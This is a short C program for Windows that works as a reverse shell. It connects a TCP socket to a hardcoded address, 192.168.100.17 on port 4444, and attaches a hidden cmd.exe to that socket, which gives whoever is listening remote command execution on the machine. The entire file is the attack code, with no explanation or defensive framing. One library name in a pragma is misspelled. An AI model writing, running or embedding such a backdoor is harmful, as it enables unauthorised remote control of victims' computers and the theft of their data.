#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;


int main(int argc, char *argv[])
{
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

   // if (argv != 3){fprintf(stderr, "Uso: <rhost> <rport>\n"); exit(1);}
    struct hostent *host;
    host = gethostbyname("192.168.100.17");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("4444"));
    hax.sin_addr.s_addr =inet_addr(ip_addr);

    WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);

}
